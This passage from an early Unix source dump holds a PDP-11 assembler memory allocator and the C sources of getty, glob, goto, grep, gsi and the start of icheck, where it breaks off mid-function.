/	mov	r1,...
/
/	requested size in bytes in r0
/	pointer to header of allocated block returned in r1
/	r0 is preserved
/
/	convert to words, adjust for header, round up
/	to a power of two
/
/	each block has a four-word header
/		W - write ptr (also used as link ptr in frlist)
/		R - read ptr
/		A - pointer to head of data
/		L - ptr to (end+1) of data
hsz=6144.
datasz = 32768.
numb=4.
numb2=2*numb
w=0
r=2
a=4
l=6
/
allocate:
	clr	garbage
	mov	r0,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	inc	stats
	bne 9f; inc stats; 9:
	cmp	r0,$datasz
	blo	9f; 4; 9:
	dec	r0
	bmi	1f
	jsr	pc,log2
	inc	r0
1:	asl	r0
	mov	r0,-(sp)
	add	$2,r0
	cmp	r0,$frend-frlist+2
	blo	zzz
	4
/
/	look on free list for block of required size
/
zzz:
	mov	(sp),r0
	tst	frlist(r0)
	beq	xxx
/
/	found it, allocate and return
/
	mov	frlist(r0),r1
	add	$hblk,r1
	mov	(r1),frlist(r0)
	mov	a(r1),r0
	mov	r0,w(r1)		/W
	mov	r0,r(r1)		/R
	tst	(sp)+
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r0
/	jsr	pc,whead
	rts	pc
/
/	no block of required size
/	look for larger block
/
xxx:
	tst	hblk
	beq	www
	tst	(r0)+
	cmp	r0,$frend-frlist
	bhis	www
	tst	frlist(r0)
	bne	yyy
	br	xxx
/
/	there are no larger blocks;  must garbage collect
/
www:	jsr	pc,collect
	tst	r0
	bne	zzz
/
/	out of space
/
	mov	$1,r0
	sys	write; 1f; 2f-1f
	jmp	interrupt
1:	<Out of space.\n>
2:	.even
/
/	split larger block into two smaller pieces and
/	link together as smaller blocks in the free list.
/
yyy:
	mov	hblk,r3	/get free header block
	beq	www	/should never get this
	mov	frlist(r0),r1
	add	$hblk,r1
	mov	w(r1),frlist(r0)
	mov	r3,w(r1)
	add	$hblk,r3
	mov	exp2-2(r0),r2
	add	a(r1),r2
	mov	w(r3),hblk
	mov	l(r1),l(r3)
	mov	r2,l(r1)		/L
	mov	r2,a(r3)
	clr	w(r3)			/W'
	mov	r1,r2
	sub	$hblk,r2
	mov	r2,frlist-2(r0)
	br	zzz
/
/
/	here to release a block
/
/	mov	...,r1
/	jsr	pc,release
/
/	pointer to block in r1
/
release:
/
/	discover that this is a plausible pointer
/
	mov	r0,-(sp)
	jsr	pc,preposterous
/
/	find free list index and link block to that entry
/
	inc	stats+2
	mov	frlist(r0),w(r1)
	clr	r(r1)
	sub	$hblk,r1
	mov	r1,frlist(r0)
	clr	r1		/self-defense
	mov	(sp)+,r0
	rts	pc
/
/
/	jsr	pc,collect
/
/	coalesce free storage by rejoining paired blocks
/	on the free list.
/	zero is returned in r0 if no paired blocks were found.
/
collect:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	r4,-(sp)
	clr	useful
	inc	stats+4.
	clr	r0		/start with smallest blocks
				/r0 contains frlist index
loop1:	mov	$frlist,r1
	add	r0,r1
/
/	try next list member at this level
/
loop2:	mov	(r1),r3
	beq	advance		/list is empty
	add	$hblk,r3
	tst	(r3)		/W
	beq	advance		/only one list element
/
/	calculate address of buddy
/
	mov	a(r3),r4
	sub	$hsz,r4
	mov	exp2(r0),r2
	xor	r2,r4
1:	add	$hsz,r4
/
/	and search for him
/
loop3:
	cmp	a(r3),r4
	beq	coal
	mov	r3,r2
	mov	w(r3),r3
	tst	r3
	beq	nocoal
	add	$hblk,r3
	br	loop3
/
/	have found a pair; remove both blocks from list,
/	coalesce them, and put them on next higher list
/
coal:	mov	$1,useful
	mov	w(r3),w(r2)	/remove him from list
	mov	(r1),r2
	add	$hblk,r2
	mov	r3,r4
	mov	w(r2),w(r1)	/remove other one
	cmp	a(r2),a(r4)
	bhi	1f
	mov	r2,-(sp)
	mov	r4,r2
	mov	(sp)+,r4
1:	mov	hblk,(r2)
	clr	r(r2)
	mov	$hsz,a(r2)
	mov	$hsz,l(r2)
	sub	$hblk,r2
	mov	r2,hblk
	add	exp2(r0),l(r4)	/L
	clr	r(r4)
	mov	frlist+2(r0),w(r4)
	sub	$hblk,r4
	mov	r4,frlist+2(r0)
	br	loop2
/
/	no buddy found, try next block on this list
/
nocoal:
	mov	(r1),r1
	add	$hblk,r1
	br	loop2
/
/	advance to next free list
/
advance:
	tst	(r0)+
	cmp	r0,$frend-frlist
	blo	loop1
	mov	useful,r0
/
/	do we have enough headers to continue?
/
	tst	garbage
	beq	1f
	mov	$1,r0
	sys	write; 4f; 5f-4f
	4
/
4:	<Out of headers.\n>
5:	.even
/
/
/	restore registers and return
/
1:
	inc	garbage
	mov	(sp)+,r4
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r1
	rts	pc
/
garbage:.=.+2
/
/	routine to find integer part of log2(x)
/
/	jsr	pc,log2
/
/	r0 = log2(r0)
/
log2:
	mov	$15.,-(sp)
	tst	r0
	bne	1f
	clr	(sp)
	br	2f
1:	asl	r0
	bcs	2f
	dec	(sp)
	br	1b
2:	mov	(sp)+,r0
	rts	pc
/
	0
exp2:
	1;2;4;10;20;40;100;200;400;1000;2000;4000;
	10000;20000;40000;100000
/
/	routine to discover whether r1 points to
/	a plausible header - to avoid ruination.
/
/	r1 is preserved and r0 gets a suitable index for frlist
/
/	jsr	pc,preposterous
/
preposterous:
	cmp	r1,$headers
	bhis	9f; 4; 9:
	cmp	r1,$headend
	blo	9f; 4; 9:
	cmp	a(r1),$hsz		/A
	bhis	9f; 4; 9:
	cmp	l(r1),$hsz+datasz	/L
	blos	9f; 4; 9:
	mov	l(r1),r0		/L
	sub	a(r1),r0		/A
	mov	r0,-(sp)
	jsr	pc,log2
	asl	r0
	cmp	exp2(r0),(sp)
	beq	9f; 4; 9:
	add	$2,r0
	cmp	r0,$frend-frlist+2
	blo	9f; 4; 9:
	sub	$2,r0
	mov	r0,(sp)
	mov	frlist(r0),r0
1:	beq	1f
	add	$hblk,r0
	cmp	r0,r1
	bne	9f; 4; 9:
	mov	(r0),r0
	br	1b
1:	mov	(sp)+,r0
	rts pc
/
/
/
whead:
	inc	stats+22.
	mov	r0,-(sp)
	mov	afout,r0
	sys	seek; 0; 0
	sys	write; hblk; hsz
	mov	(sp)+,r0
	rts	pc
/
/
initl:
	clr	hblk
	mov	r0,-(sp)
	mov	r2,-(sp)
	sys	open;almem; 1	/open for write
	bec	2f
	sys	creat;almem; 666
	bes	err2
	inc	hblk
2:
	mov	r0,afout
	sys	open; almem; 0	/open for read
	bes	err2
	mov	r0,afi
	br	1f
/
err2:
	mov	$1,r0
	sys	write; 4f; 5f-4f
	4
	.data
4:	<cannot open output file\n>
5:
almem:	<form.m\0>
	.even
	.text
/
1:
	tst	hblk
	bgt	1f
	sys	read; hblk; hsz	/r0 already afi
	mov	asmdisc,asmem
	add	$hblk,asmem
	br	2f
1:
	mov	$headers,r2
	mov	r2,r0
	sub	$hblk,r0
	mov	r0,hblk
1:
	add	$8,r0
	mov	r0,(r2)
	add	$8,r2
	cmp	r2,$headend-8.
	blo	1b
	clr	-8(r2)
	mov	$frlist,r0
1:
	clr	(r0)+
	cmp	r0,$frend
	blo	1b

	mov	hblk,r2
	add	$hblk,r2
	mov	(r2),hblk
	clr	w(r2)
	mov	$hsz,a(r2)
	mov	$hsz+datasz,l(r2)
	mov	$datasz,r0
	jsr	pc,log2
	asl	r0
	cmp	r0,$frend-frlist
	blo	9f; 4; 9:
	sub	$hblk,r2
	mov	r2,frlist(r0)
/
/	install plausible pointers to make octal dumps look nice
/
	mov	$hblk,r1
1:
	mov	(r1),r1
	tst	r1
	beq	1f
	add	$hblk,r1
	mov	$hsz,a(r1)
	mov	$hsz,l(r1)
	mov	$hsz,r(r1)
	br	1b
1:
	mov	afout,r0
	sys	write;hblk;hsz
	jsr	pc,reset
	mov	$4,r0
	jsr	pc,allocate
	mov	r1,asmem
	mov	r1,asmdisc
	sub	$hblk,asmdisc
2:
	mov	(sp)+,r2
	mov	(sp)+,r0
	rts	pc
/
/
	.bss
/
b1s:	.=.+numb2
b1e:	.=.+numb2
w1:	.=.+numb2
u1:	.=.+numb2
b1:	.=. + [512.*numb]
flag: .=.+2
stats:	.=.+24.	/alloc/release/collect/get/put/seek/copy
useful:	.=.+2
afi:	.=.+2
afout:	.=.+2
asmem: .=.+2
nchar:	.=.+2
/
/
hblk: 	.=.+2	/must remain here - pointer to free header
frlist: .=hblk+34.
frend:
asmdisc:.=.+2
headers: .=hblk+hsz
headend:
	.text
-- /usr/source/s1/getty.c mode=0100664 uid=3 gid=3 atime=174922978 mtime=169260572 --
#
/*
 * getty -- adapt to terminal speed on dialup, and call login
 */

/*
 * tty flags
 */
#define	HUPCL 01
#define	XTABS	02
#define	LCASE	04
#define	ECHO	010
#define	CRMOD	020
#define	RAW	040
#define	ODDP	0100
#define	EVENP	0200
#define	ANYP	0300

/*
 * Delay algorithms
 */
#define	CR1	010000
#define	CR2	020000
#define	CR3	030000
#define	NL1	000400
#define	NL2	001000
#define	NL3	001400
#define	TAB1	002000
#define	TAB2	004000
#define	TAB3	006000
#define	FF1	040000

#define	ERASE	'#'
#define	KILL	'@'

/*
 * speeds
 */
#define	B110	3
#define	B150	5
#define	B300	7
#define	B9600	13

#define	SIGINT	2
#define	SIGQIT	3

struct	sgtty {
	char	sgispd, sgospd;
	char	sgerase, sgkill;
	int	sgflag;
} tmode;

struct	tab {
	int	tname;		/* this table name */
	int	nname;		/* successor table name */
	int	iflags;		/* initial flags */
	int	fflags;		/* final flags */
	int	ispeed;		/* input speed */
	int	ospeed;		/* output speed */
	char	*message;	/* login message */
} itab[] {

/* table '0'-1-2 300,150,110 */

	'0', 1,
	ANYP+RAW+NL1+CR1, ANYP+ECHO+CR1,
	B300, B300,
	"\n\r\033;\007login: ",

	1, 2,
	ANYP+RAW+NL1+CR1, EVENP+ECHO+FF1+CR2+TAB1+NL1,
	B150, B150,
	"\n\r\033:\006\006\017login: ",

	2, '0',
	ANYP+RAW+NL1+CR1, ANYP+ECHO+CRMOD+XTABS+LCASE+CR1,
	B110, B110,
	"\n\rlogin: ",

/* table '-' -- Console TTY 110 */
	'-', '-',
	ANYP+RAW+NL1+CR1, ANYP+ECHO+CRMOD+XTABS+LCASE+CR1,
	B110, B110,
	"\n\rlogin: ",

/* table '1' -- 150 */
	'1', '1',
	ANYP+RAW+NL1+CR1, EVENP+ECHO+FF1+CR2+TAB1+NL1,
	B150, B150,
	"\n\r\033:\006\006\017login: ",

/* table '2' -- 9600 */
	'2', '2',
	ANYP+RAW+NL1+CR1, ANYP+XTABS+ECHO+CRMOD+FF1,
	B9600, B9600,
	"\n\r\033;login: ",
};

#define	NITAB	sizeof itab/sizeof itab[0]

char	name[16];
int	crmod;
int	upper;
int	lower;

main(argc, argv)
char **argv;
{
	register struct tab *tabp;
	register tname;

/*
	signal(SIGINT, 1);
	signal(SIGQIT, 0);
*/
	tname = '0';
	if (argc > 1)
		tname = *argv[1];
	for (;;) {
		for(tabp = itab; tabp < &itab[NITAB]; tabp++)
			if(tabp->tname == tname)
				break;
		if(tabp >= &itab[NITAB])
			tabp = itab;
		tmode.sgispd = tabp->ispeed;
		tmode.sgospd = tabp->ospeed;
		tmode.sgflag = tabp->iflags;
		tmode.sgispd = tabp->ispeed;
		tmode.sgospd = tabp->ospeed;
		stty(0, &tmode);
		puts(tabp->message);
		stty(0, &tmode);
		if(getname()) {
			tmode.sgerase = ERASE;
			tmode.sgkill = KILL;
			tmode.sgflag = tabp->fflags;
			if(crmod)
				tmode.sgflag =| CRMOD;
			if(upper)
				tmode.sgflag =| LCASE;
			if(lower)
				tmode.sgflag =& ~LCASE;
			stty(0, &tmode);
			execl("/bin/login", "login", name, 0);
			exit(1);
		}
		tname = tabp->nname;
	}
}

getname()
{
	register char *np;
	register c;
	static cs;

	crmod = 0;
	upper = 0;
	lower = 0;
	np = name;
	do {
		if (read(0, &cs, 1) <= 0)
			exit(0);
		if ((c = cs&0177) == 0)
			return(0);
		write(1, &cs, 1);
		if (c>='a' && c <='z')
			lower++;
		else if (c>='A' && c<='Z') {
			upper++;
			c =+ 'a'-'A';
		} else if (c==ERASE) {
			if (np > name)
				np--;
			continue;
		} else if (c==KILL) {
			np = name;
			continue;
		}
		*np++ = c;
	} while (c!='\n' && c!='\r' && np <= &name[16]);
	*--np = 0;
	if (c == '\r') {
		write(1, "\n", 1);
		crmod++;
	} else
		write(1, "\r", 1);
	return(1);
}

puts(as)
char *as;
{
	register char *s;

	s = as;
	while (*s)
		write(1, s++, 1);
}
-- /usr/source/s1/glob.c mode=0100664 uid=3 gid=3 atime=174922991 mtime=169260572 --
#
/* global command --

   glob params

   "*" in params matches r.e ".*"
   "?" in params matches r.e. "."
   "[...]" in params matches character class
   "[...a-z...]" in params matches a through z.

   perform command with argument list
  constructed as follows:
     if param does not contain "*", "[", or "?", use it as is
     if it does, find all files in current directory
     which match the param, sort them, and use them

   prepend the command name with "/bin" or "/usr/bin"
   as required.
*/

#define	E2BIG	7
#define	ENOEXEC	8
#define	ENOENT	2

#define	STRSIZ	522
char	ab[STRSIZ];		/* generated characters */
char	*ava[200];		/* generated arguments */
char	**av &ava[1];
char	*string ab;
int	errno;
int	ncoll;

main(argc, argv)
char *argv[];
{
	register char *cp;

	if (argc < 3) {
		write(2, "Arg count\n", 10);
		return;
	}
	argv++;
	*av++ = *argv;
	while (--argc >= 2)
		expand(*++argv);
	if (ncoll==0) {
		write(2, "No match\n", 9);
		return;
	}
	execute(ava[1], &ava[1]);
	cp = cat("/usr/bin/", ava[1]);
	execute(cp+4, &ava[1]);
	execute(cp, &ava[1]);
	write(2, "Command not found.\n", 19);
}

expand(as)
char *as;
{
	register char *s, *cs;
	register int dirf;
	char **oav;
	static struct {
		int	ino;
		char	name[16];
	} entry;

	s = cs = as;
	while (*cs!='*' && *cs!='?' && *cs!='[') {
		if (*cs++ == 0) {
			*av++ = cat(s, "");
			return;
		}
	}
	for (;;) {
		if (cs==s) {
			dirf = open(".", 0);
			s = "";
			break;
		}
		if (*--cs == '/') {
			*cs = 0;
			dirf = open(s==cs? "/": s, 0);
			*cs++ = 0200;
			break;
		}
	}
	if (dirf<0) {
		write(2, "No directory\n", 13);
		exit();
	}
	oav = av;
	while (read(dirf, &entry, 16) == 16) {
		if (entry.ino==0)
			continue;
		if (match(entry.name, cs)) {
			*av++ = cat(s, entry.name);
			ncoll++;
		}
	}
	close(dirf);
	sort(oav);
}

sort(oav)
char **oav;
{
	register char **p1, **p2, **c;

	p1 = oav;
	while (p1 < av-1) {
		p2 = p1;
		while(++p2 < av) {
			if (compar(*p1, *p2) > 0) {
				c = *p1;
				*p1 = *p2;
				*p2 = c;
			}
		}
		p1++;
	}
}

execute(afile, aarg)
char *afile;
char **aarg;
{
	register char *file, **arg;

	arg = aarg;
	file = afile;
	execv(file, arg);
	if (errno==ENOEXEC) {
		arg[0] = file;
		*--arg = "/bin/sh";
		execv(*arg, arg);
	}
	if (errno==E2BIG)
		toolong();
}

toolong()
{
	write(2, "Arg list too long\n", 18);
	exit();
}

match(s, p)
char *s, *p;
{
	if (*s=='.' && *p!='.')
		return(0);
	return(amatch(s, p));
}

amatch(as, ap)
char *as, *ap;
{
	register char *s, *p;
	register scc;
	int c, cc, ok, lc;

	s = as;
	p = ap;
	if (scc = *s++)
		if ((scc =& 0177) == 0)
			scc = 0200;
	switch (c = *p++) {

	case '[':
		ok = 0;
		lc = 077777;
		while (cc = *p++) {
			if (cc==']') {
				if (ok)
					return(amatch(s, p));
				else
					return(0);
			} else if (cc=='-') {
				if (lc<=scc && scc<=(c = *p++))
					ok++;
			} else
				if (scc == (lc=cc))
					ok++;
		}
		return(0);

	default:
		if (c!=scc)
			return(0);

	case '?':
		if (scc)
			return(amatch(s, p));
		return(0);

	case '*':
		return(umatch(--s, p));

	case '\0':
		return(!scc);
	}
}

umatch(s, p)
char *s, *p;
{
	if(*p==0)
		return(1);
	while(*s)
		if (amatch(s++,p))
			return(1);
	return(0);
}

compar(as1, as2)
char *as1, *as2;
{
	register char *s1, *s2;

	s1 = as1;
	s2 = as2;
	while (*s1++ ==  *s2)
		if (*s2++ == 0)
			return(0);
	return (*--s1 - *s2);
}

cat(as1, as2)
char *as1, *as2;
{
	register char *s1, *s2;
	register int c;

	s2 = string;
	s1 = as1;
	while (c = *s1++) {
		if (s2 > &ab[STRSIZ])
			toolong();
		c =& 0177;
		if (c==0) {
			*s2++ = '/';
			break;
		}
		*s2++ = c;
	}
	s1 = as2;
	do {
		if (s2 > &ab[STRSIZ])
			toolong();
		*s2++ = c = *s1++;
	} while (c);
	s1 = string;
	string = s2;
	return(s1);
}
-- /usr/source/s1/goto.c mode=0100664 uid=3 gid=3 atime=174923005 mtime=169260572 --
int	offset	0;

main(argc, argv)
char *argv[];
{
	extern fin;
	char line[64];

	if (argc<2 || ttyn(0)!='x') {
		write(1, "goto error\n", 11);
		seek(0, 0, 2);
		return;
	}
	seek(0, 0, 0);
	fin = dup(0);

loop:
	if (getlin(line)) {
		write(1, "label not found\n", 16);
		return;
		}
	if (compar(line, argv[1])) goto loop;
	seek(0, offset, 0);
}

getlin(s)
char s[];
{
	int ch, i;

	i = 0;
l:
	if ((ch=getc())=='\0') return(1);
	if (ch!=':') {
		while(ch!='\n' && ch!='\0')
			ch = getc();
		goto l;
		}
	while ((ch=getc())==' ');
	while (ch!=' ' && ch!='\n' && ch!='\0') {
		s[i++] = ch;
		ch = getc();
		}
	while(ch != '\n')
		ch = getc();
	s[i] = '\0';
	return(0);
}

compar(s1, s2)
char s1[], s2[];
{
	int c, i;

	i = 0;
l:
	if(s1[i] != s2[i]) return(1);
	if (s1[i++] == '\0') return(0);
	goto l;
}

getc()
{

	offset++;
	return(getchar());
}
-- /usr/source/s1/grep.c mode=0110664 uid=3 gid=3 atime=174923016 mtime=174845354 --
#
/*
 * grep -- print lines matching (or not matching) a pattern
 *
 */

#define	CCHR	2
#define	CDOT	4
#define	CCL	6
#define	NCCL	8
#define	CDOL	10
#define	CEOF	11

#define	STAR	01

#define	LBSIZE	256
#define	ESIZE	256

char	ibuf[512];
char	expbuf[ESIZE];
int	lnum[2];
char	linebuf[LBSIZE+1];
int	bflag;
int	nflag;
int	cflag;
int	vflag;
int	nfile;
int	circf;
int	blkno;
int	tln[2];

main(argc, argv)
char **argv;
{
	extern fout;

	fout = dup(1);
	flush();
	while (--argc > 0 && (++argv)[0][0]=='-')
		switch (argv[0][1]) {

		case 'v':
			vflag++;
			continue;

		case 'b':
			bflag++;
			continue;

		case 'c':
			cflag++;
			continue;

		case 'n':
			nflag++;
			continue;

		default:
			printf2("Unknown flag\n");
			continue;
		}
	if (argc<=0)
		exit(2);
	compile(*argv);
	nfile = --argc;
	if (argc<=0)
		execute(0);
	else while (--argc >= 0) {
		argv++;
		execute(*argv);
	}
	flush();
	exit(0);
}

compile(astr)
char *astr;
{
	register c;
	register char *ep, *sp;
	char *lastep;
	int cclcnt;

	ep = expbuf;
	sp = astr;
	if (*sp == '^') {
		circf++;
		sp++;
	}
	for (;;) {
		if (ep >= &expbuf[ESIZE])
			goto cerror;
		if ((c = *sp++) != '*')
			lastep = ep;
		switch (c) {

		case '\0':
			*ep++ = CEOF;
			return;

		case '.':
			*ep++ = CDOT;
			continue;

		case '*':
			if (lastep==0)
				goto defchar;
			*lastep =| STAR;
			continue;

		case '$':
			if (*sp != '\0')
				goto defchar;
			*ep++ = CDOL;
			continue;

		case '[':
			*ep++ = CCL;
			*ep++ = 0;
			cclcnt = 1;
			if ((c = *sp++) == '^') {
				c = *sp++;
				ep[-2] = NCCL;
			}
			do {
				*ep++ = c;
				cclcnt++;
				if (c=='\0' || ep >= &expbuf[ESIZE])
					goto cerror;
			} while ((c = *sp++) != ']');
			lastep[1] = cclcnt;
			continue;

		case '\\':
			if ((c = *sp++) == '\0')
				goto cerror;
		defchar:
		default:
			*ep++ = CCHR;
			*ep++ = c;
		}
	}
    cerror:
	printf2("RE error\n");
}

execute(file)
{
	register char *p1, *p2;
	register c;
	int f;
	char *ebp, *cbp;

	if (file) {
		if ((f = open(file, 0)) < 0) {
			printf2("Can't open %s\n", file);
		}
	} else
		f = 0;
	ebp = ibuf;
	cbp = ibuf;
	lnum[0] = 0;
	lnum[1] = 0;
	tln[0] = 0;
	tln[1] = 0;
	blkno = -1;
	for (;;) {
		if ((++lnum[1])==0)
			lnum[1]++;
		if((lnum[1]&0377) == 0)
			flush();
		p1 = linebuf;
		p2 = cbp;
		for (;;) {
			if (p2 >= ebp) {
				if ((c = read(f, ibuf, 512)) <= 0) {
					close(f);
					if (cflag) {
						if (nfile > 1)
							printf("%s:", file);
						p1 = locv(tln[0],tln[1]);
						printf("%s\n", p1);
					}
					return;
				}
				blkno++;
				p2 = ibuf;
				ebp = ibuf+c;
			}
			if ((c = *p2++) == '\n')
				break;
			if(c)
			if (p1 < &linebuf[LBSIZE-1])
				*p1++ = c;
		}
		*p1++ = 0;
		cbp = p2;
		p1 = linebuf;
		p2 = expbuf;
		if (circf) {
			if (advance(p1, p2))
				goto found;
			goto nfound;
		}
		/* fast check for first character */
		if (*p2==CCHR) {
			c = p2[1];
			do {
				if (*p1!=c)
					continue;
				if (advance(p1, p2))
					goto found;
			} while (*p1++);
			goto nfound;
		}
		/* regular algorithm */
		do {
			if (advance(p1, p2))
				goto found;
		} while (*p1++);
	nfound:
		if (vflag)
			succeed(file);
		continue;
	found:
		if (vflag==0)
			succeed(file);
	}
}

advance(alp, aep)
{
	register char *lp, *ep, *curlp;
	char *nextep;

	lp = alp;
	ep = aep;
	for (;;) switch (*ep++) {

	case CCHR:
		if (*ep++ == *lp++)
			continue;
		return(0);

	case CDOT:
		if (*lp++)
			continue;
		return(0);

	case CDOL:
		if (*lp==0)
			continue;
		return(0);

	case CEOF:
		return(1);

	case CCL:
		if (cclass(ep, *lp++, 1)) {
			ep =+ *ep;
			continue;
		}
		return(0);

	case NCCL:
		if (cclass(ep, *lp++, 0)) {
			ep =+ *ep;
			continue;
		}
		return(0);

	case CDOT|STAR:
		curlp = lp;
		while (*lp++);
		goto star;

	case CCHR|STAR:
		curlp = lp;
		while (*lp++ == *ep);
		ep++;
		goto star;

	case CCL|STAR:
	case NCCL|STAR:
		curlp = lp;
		while (cclass(ep, *lp++, ep[-1]==(CCL|STAR)));
		ep =+ *ep;
		goto star;

	star:
		do {
			lp--;
			if (advance(lp, ep))
				return(1);
		} while (lp > curlp);
		return(0);

	default:
		printf2("RE botch\n");
	}
}

cclass(aset, ac, af)
{
	register char *set, c;
	register n;

	set = aset;
	if ((c = ac) == 0)
		return(0);
	n = *set++;
	while (--n)
		if (*set++ == c)
			return(af);
	return(!af);
}

printf2(s, a)
{
	extern fout;
	flush();
	fout = 2;
	printf(s, a);
	flush();
	exit(2);
}

succeed(f)
{
	if (cflag) {
		if (++tln[1]==0)
			tln[0]++;
		return;
	}
	if (nfile > 1)
		printf("%s:", f);
	if (bflag)
		printf("%l:", blkno);
	if (nflag)
		printf("%s:", locv(lnum[0], lnum[1]));
	printf("%s\n", linebuf);
}
-- /usr/source/s1/gsi.c mode=0100664 uid=3 gid=3 atime=174923032 mtime=169260572 --
#define	PLOT	006	/* ack */
#define BEL    007     /* exit plot mode */
#define	ESC	033	/* escape */
#define	HFWD	'9'
#define	HREV	'8'
#define	FREV	'7'
#define	SO	016	/* shift out - enter greek */
#define	SI	017	/* shift in */
#define	UP	013
#define	DN	012
#define	RT	' '
#define	LF	'\b'

int	restore();
int	svmode, mode[3];

main(argc,argv) int argc; char **argv; {
	int c, textmode;
	extern int fin,fout;
	fin = dup(0);
	fout = dup(1);
	if ((signal(2, 1) & 01) == 0)
		signal(2, &restore);
	gtty(1, mode);
	svmode = mode[2];
	mode[2] =& 0777757;	/* turn off cr-lf  */
	mode[2] =| 03;	/* turn off delays, tabs */
	stty(1, mode);
	textmode = 1;
	while( (c=getchar()) != '\0' ){
		if( c==SO ){
			special();
			continue;
		}
		if (c== PLOT) textmode = 1-textmode;
		if (c==BEL) textmode = 1;
		if( c=='\n' && textmode )
			putchar(015);	/* CR */
		if( c!=ESC ){
			putchar(c);
			continue;
		}
		putchar(PLOT);
		c = getchar();
		if( c == HREV )
			nplot(4,UP);
		else if( c == HFWD )
			nplot(4,DN);
		else if( c == FREV )
			nplot(8,UP);
		putchar(PLOT);
	}
	flush();
	restore();
}

restore(){
	mode[2] = svmode;
	stty(1, mode);
	exit();
}

int	tab[]{
	'A',	/* alpha */
	'B',	/* beta */
	'D',	/* delta */
	'W',	/* DELTA */
	'S',	/* epsilon */
	'N',	/* eta */
	'\\',	/* gamma */
	'G',	/* GAMMA */
	'o',	/* infinity - not in M37 */
	'^',	/* integral */
	'L',	/* lambda */
	'E',	/* LAMBDA */
	'M',	/* mu */
	'[',	/* nabla (del) */
	'_',	/* not */
	'@',	/* nu */
	'C',	/* omega */
	'Z',	/* OMEGA */
	']',	/* partial */
	'U',	/* phi */
	'F',	/* PHI */
	'V',	/* psi */
	'H',	/* PSI */
	'J',	/* pi */
	'P',	/* PI */
	'K',	/* rho */
	'Y',	/* sigma */
	'R',	/* SIGMA */
	'I',	/* tau */
	'T',	/* theta */
	'O',	/* THETA */
	'X',	/* xi */
	'Q',	/* zeta */
	0
};
int	trans[]{
	alpha,
	beta,
	delta,
	DELTA,
	epsilon,
	eta,
	gamma,
	GAMMA,
	infinity,
	integral,
	lambda,
	LAMBDA,
	mu,
	nabla,
	not,
	nu,
	omega,
	OMEGA,
	partial,
	phi,
	PHI,
	psi,
	PSI,
	pi,
	PI,
	rho,
	sigma,
	SIGMA,
	tau,
	theta,
	THETA,
	xi,
	zeta,
	0
};

int alpha[]	{LF,'c',RT,RT,'(',LF,0};
int beta[]	{'B',LF,LF,DN,DN,'|',RT,RT,UP,UP,0};
int delta[]	{'o',UP,UP,'<',DN,DN,0};
int DELTA[]	{LF,LF,'/',-3,DN,'-',-4,RT,'-',-3,UP,'\\',LF,LF,0};
int epsilon[]	{'<','-',0};
int eta[]	{'n',RT,RT,DN,DN,'|',LF,LF,UP,UP,0};
int gamma[]	{')',RT,'/',LF,0};
int GAMMA[]	{LF,LF,'|',RT,RT,-3,UP,'-',-3,DN,RT,RT,'`',LF,LF,0};
int infinity[]	{LF,LF,'c',-4,RT,'o',LF,LF,0};
int integral[]	{'|','\'',RT,RT,'`',-3,LF,-6,DN,'\'',LF,'`',RT,RT,-6,UP,0};
int lambda[]	{'\\',-4,DN,LF,'\'',DN,LF,'\'',-5,UP,RT,RT,0};
int LAMBDA[]	{LF,LF,'/',-4,RT,'\\',LF,LF,0};
int mu[]	{'u',LF,LF,',',RT,RT,0};
int nabla[]	{LF,LF,'\\',-3,UP,'-',-4,RT,'-',-3,DN,'/',LF,LF,0};
int not[]	{'-',-2,RT,UP,',',DN,-2,LF,0};
int nu[]	{LF,'(',-3,RT,'/',LF,LF,0};
int omega[]	{LF,'u',-3,RT,'u',LF,LF,0};
int OMEGA[]	{'O',DN,DN,LF,'-',RT,RT,'-',LF,UP,UP,0};
int partial[]	{'o',RT,DN,'`',LF,UP,'`',LF,UP,'`',RT,DN,0};
int phi[]	{'o','/',0};
int PHI[]	{'o','[',']',0};
int psi[]	{'/','-',DN,DN,RT,RT,'\'',-4,LF,'\'',RT,RT,UP,UP,0};
int PSI[]	{'[',']','-',DN,DN,RT,RT,'\'',-4,LF,'`',RT,RT,UP,UP,0};
int pi[]	{UP,'-',-3,DN,'"',DN,'"',-3,UP,0};
int PI[]	{LF,LF,'[',']',-4,RT,'[',']',LF,LF,-3,UP,'-',-3,DN,0};
int rho[]	{'o',LF,LF,DN,DN,'|',UP,UP,RT,RT,0};
int sigma[]	{'o',DN,RT,RT,'~',UP,LF,LF,0};
int SIGMA[]	{'>',-2,DN,'-',-5,UP,'-',-3,DN,0};
int tau[]	{'t',DN,RT,RT,'~',LF,LF,LF,'~',RT,UP,0};
int theta[]	{'O','-',0};
int THETA[]	{'O','=',0};
int xi[]	{'c',RT,DN,',',LF,-3,UP,'c',LF,DN,'`',RT,DN,0};
int zeta[]	{'c',RT,DN,',',LF,-3,UP,'<',DN,DN,0};

special(){
	int c,i,j,t;
   loop:
	if( (c=getchar()) == SI )
		return;
	for( i=0; tab[i]!=0; i++)
		if( c==tab[i] ){
			plot(trans[i]);
			goto loop;
		}
	putchar(c);
	goto loop;
}

plot(s) int *s; {
	int i,c;
	putchar(PLOT);
	for( i=0; (c=s[i])!=0; i++ )
		if( c<0 )
			nplot(-c,s[++i]);
		else
			putchar(c);
	putchar(PLOT);
	putchar(' ');
}

nplot(n,c) int n,c; {
	while(n--)
		putchar(c);
}
-- /usr/source/s1/icheck.c mode=0110664 uid=3 gid=3 atime=174923048 mtime=174892457 --
#

char	*dargv[]
{
	"/dev/rrk2",
	"/dev/rrp0",
	0
};
#define	NINODE	16*16
#define	NB	10
#include "/usr/sys/ino.h"
#include "/usr/sys/filsys.h"

struct	inode	inode[NINODE];
struct	filsys	sblock;

int	sflg;

int	fi;
int	nifiles;
int	nfile;
int	nspcl;
int	nlarg;
int	nvlarg;
int	nindir;
int	nvindir;
int	ndir;
int	nused;
int	nfree;
int	ino;
int	ndup;
int	blist[10] { -1};
int	nerror;
int	bmap[4096];

main(argc, argv)
char **argv;
{
	register char **p;
	register int n, *lp;

	if (argc == 1) {
		for (p = dargv; *p;)
			check(*p++);
		return(nerror);
	}
	while (--argc) {
		argv++;
		if (**argv=='-') switch ((*argv)[1]) {
		case 's':
			sflg++;
			continue;

		case 'b':
			lp = blist;
			while (lp < &blist[NB-1] && (n = number(argv[1]))) {
				*lp++ = n;
				argv++;
				argc--;
			}
			*lp++ = -1;
			continue;

		default:
			printf("Bad flag\n");
